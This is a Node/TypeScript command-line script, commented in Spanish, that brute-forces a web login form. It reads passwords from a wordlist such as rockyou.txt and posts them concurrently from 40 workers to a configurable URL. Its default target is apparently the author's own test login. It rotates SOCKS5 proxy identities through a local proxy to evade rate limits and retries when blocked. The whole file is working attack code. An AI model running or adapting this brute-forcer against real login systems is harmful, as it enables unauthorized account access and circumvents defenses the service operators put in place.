#!/usr/bin/env node



 //-------------importaciones--------------

import yargs from 'yargs'

import {hideBin} from 'yargs/helpers'

import fs from 'fs'

import { SocksProxyAgent } from 'socks-proxy-agent'
import axios from 'axios'

import net from 'net'
import dns from 'dns/promises'






    
//subrama1: yargs:



const yarg= yargs(hideBin(process.argv))

.option("url",{demandOption:false,type:"string"})

.option("n",{type:"number",demandOption:false, default:5})

.option("header",{type:"string",default:"application/json"})

.option("workers",{type:"number",default:40})

.option("body",{type:"string",default:`{"usuario":"netaru3","contraseña":"contra"}`})


.option("wordlist",{type:"string",default:"/usr/share/wordlists/rockyou.txt"})

.option("error",{type:"string",default:"error"})
.parseSync()




//-------------declaración de variables--------------------

let control_ports=[9053,9055,9057,9059,9061]





let found=false


let url= yarg.url || "https://login-de-pruebas2.onrender.com/login"

const objURL= new URL(url)

const ip= await dns.lookup(objURL.hostname)

let token=0





let wordlist= fs.readFileSync(yarg.wordlist).toString().split("\n")


let workers=0

let sockets=0

let N_tomany:number=0

let N_tomany_repetido:number=0

let num_de_peticiones=0

let Npassword=0


let contraseñas_probadas=0


let header=yarg.header


let a=0



// for(let contra of wordlist){

//     if(contra==="password123"){console.log("contraseña encontrada, indice:",a)}

//     ++a

// }



//declaracion de funciones



async function worker(){

 while(found===false && sockets<180 && Npassword<wordlist.length){
        
    let i=0; 

    ++token
    const agent = new SocksProxyAgent(`socks5h://user_${token}:${token}@127.0.0.1:16379`,{keepAlive:true})


    async function peticion(contraseña:any,body:any,agent:any){
    if(sockets>200){console.log("se pasó el límite")}
    
   if(sockets<150){ return axios.post(url,body,{httpAgent:agent,httpsAgent:agent,headers:{"Content-Type":header,'Host':objURL.hostname},timeout:30000})

      .then(function(data){--sockets;
        if(data.data.includes("to many")){++token;peticion(contraseña,body,agent)}

        if(!data.data.includes("to many")){++num_de_peticiones};

        if(data.data!=="error"){console.log("la contraseña es:",contraseña); found=true; process.exit(1)}}).catch(function(error){if(error.response && (error.response.data.error.includes("intentos") || error.response.data.error.includes("many"))){ ++N_tomany}
        else if(N_tomany%100===0 && N_tomany!==0 && N_tomany!==N_tomany_repetido){N_tomany_repetido=N_tomany; console.log(N_tomany, "to many requests")}
        else{console.log("error:",error.cause)};++token;
        const  agent1 = new SocksProxyAgent(`socks5h://user_${token}:${token}@127.0.0.1:16379`,{keepAlive:true}); peticion(contraseña,body,agent1)})}}
   
    if( num_de_peticiones!==0 &&num_de_peticiones%100===0 && num_de_peticiones!==contraseñas_probadas){console.log("contraseñas probadas:",num_de_peticiones); contraseñas_probadas=num_de_peticiones}


    while(i<yarg.n){try{let body=JSON.parse(yarg.body!);
        if(sockets>200){console.log("se pasó el límite")}
        let contraseña= wordlist[++Npassword];
         const keys = Object.keys(body);
      body[keys[1]] = contraseña; 

      if(contraseña==="password123"){console.log("contraseña encontrada")}
        
    // axios.get("https://api.ipify.org",{httpAgent:agent,httpsAgent:agent}).then(function(data){console.log(data.data)}).catch(function(error){console.log("error en axios")})
     if(sockets<150){ ++sockets}
       await peticion(contraseña,body,agent)
       
       

     

    }catch(error:any){console.log("error:",error.cause)}

        ++i;

    }}

}


setInterval(() => {
    console.log("sockets:",sockets)
}, 2000);

//-----------codigo-------------






  


    


  
 while(workers<yarg.workers){worker();++workers}  



    
       
